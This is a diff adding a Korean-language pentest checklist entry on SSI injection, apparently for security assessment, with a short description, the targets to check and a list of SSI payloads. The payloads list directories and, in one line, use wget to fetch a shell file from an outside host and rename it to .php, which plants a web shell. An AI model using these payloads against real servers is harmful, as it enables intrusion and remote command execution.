@@ -1,0 +1,49 @@
+취약점 소개
+--------------------------
+동적 콘텐츠가 포함된 HTML 페이지를 제공하는 데 사용되는 웹 애플리케이션이 조작되는 취약점
+
+점검 대상
+--------------------------
+- 웹 애플리케이션 소스 코드
+- 웹 서버 & 방화벽
+
+진단 방법
+--------------------------
+- 사용자 입력 값에 대한 검증이 적절히 이루어져 있는지 확인
+
+Payload
+--------------------------
+Linux: 
+-> List files of directory
+<!--#exec cmd="ls" -->
+
+-> Access directories
+<!--#exec cmd="cd /root/dir/">
+
+-> Execution script
+<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->
+
+
+Windows:
+-> List files of directory:
+<!--#exec cmd="dir" -->
+
+-> Access directories
+<!--#exec cmd="cd C:\admin\dir">
+
+
+서버의 정보에 엑세스하고 설정하는 데 사용할 수 있는 기타 SSI 예시:
+-> 오류 메시지 출력을 변경하려면:
+<!--#config errmsg="File not found, informs users and password"-->
+
+-> 현재 문서 파일 이름을 표시하려면
+<!--#echo var="DOCUMENT_NAME" -->
+
+-> 가상 경로와 파일 이름을 표시하려면
+<!--#echo var="DOCUMENT_URI" -->
+
+-> 두 매개변수를 사용하면 날짜 및 시간 출력 형식을 제어
+<!--#config timefmt="A %B %d %Y %r"-->
+
+-> "fsize" 명령, 선택한 파일의 크기를 인쇄
+<!--#fsize file="ssi.shtml" -->
